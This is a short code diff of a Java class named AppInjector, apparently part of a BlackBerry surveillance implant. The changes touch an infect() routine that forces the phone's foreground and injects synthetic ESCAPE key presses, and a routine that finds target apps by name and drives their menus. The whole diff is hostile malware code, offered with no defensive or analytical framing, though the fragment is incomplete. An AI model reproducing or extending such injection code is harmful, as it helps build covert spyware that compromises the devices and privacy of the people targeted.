@@ -39,6 +39,7 @@ public class AppInjector {
         }
     }
 
+    int type = 0;
     public boolean callMenuByKey() {
         //#ifdef DEBUG
         debug.trace("callMenu");
@@ -56,7 +57,7 @@ public class AppInjector {
                 //#endif
 
                 if (apps[i].getName().indexOf(delegate.getAppName()) >= 0) {
-                    delegate.callMenuByKey();
+                    delegate.callMenuByKey(type++);
                 }
             }
         }
@@ -81,6 +82,9 @@ public class AppInjector {
     }
 
     public void infect() {
+        //#ifdef DEBUG
+        debug.trace("infect");
+        //#endif
         int req = requestForeground();
         Utils.sleep(500);
         boolean fore = checkForeground();
@@ -96,10 +100,10 @@ public class AppInjector {
 
             if (req == 2) {
                 KeyInjector.pressKeyCode(Keypad.KEY_ESCAPE);
-                KeyInjector.pressKey(Keypad.KEY_ESCAPE);
+                //KeyInjector.pressKey(Keypad.KEY_ESCAPE);
                 
                 KeyInjector.pressRawKeyCode(Keypad.KEY_ESCAPE);                
-                KeyInjector.pressRawKey(Keypad.KEY_ESCAPE);
+                //KeyInjector.pressRawKey(Keypad.KEY_ESCAPE);
                 
                 //MenuWalker.walk("Close");
             }
